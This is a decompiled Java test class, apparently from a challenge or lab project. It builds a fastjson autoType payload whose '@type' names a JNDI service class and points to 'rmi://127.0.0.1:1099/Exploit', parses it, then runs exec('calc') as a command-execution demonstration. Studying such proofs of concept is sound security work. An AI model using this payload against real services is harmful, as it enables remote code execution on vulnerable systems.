//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package ycb.simple_json;

import com.alibaba.fastjson.JSON;
import org.omg.SendingContext.RunTime;
import ycb.simple_json.message.Message;

import java.io.IOException;

public class Test {
    public Test() {
    }

    public static void main(String[] args) throws IOException, InterruptedException {
        String jsonStr = "{\"content\" : {\"@type\": \"ycb.simple_json.service.JNDIService\", \"target\":\"rmi://127.0.0.1:1099/Exploit\"}, \"msg\":{\"$ref\":\"$.content.context\"}}";
        System.out.println(jsonStr);
        Object obj = (JSON.parseObject(jsonStr));
        Runtime.getRuntime().exec("calc");
//        System.out.println(obj);
    }
}
